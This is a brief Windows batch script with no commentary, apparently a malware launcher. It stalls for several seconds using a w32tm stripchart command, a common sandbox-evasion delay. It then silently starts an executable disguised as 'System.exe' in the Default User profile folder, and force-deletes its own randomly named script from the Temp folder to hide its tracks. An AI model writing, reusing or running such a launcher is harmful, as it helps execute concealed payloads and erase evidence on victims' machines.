@echo off
w32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2  1>nul
start "" "C:\Users\Default User\System.exe"
del /a /q /f "C:\Users\Admin\AppData\Local\Temp\\Q3of4LgtPX.bat"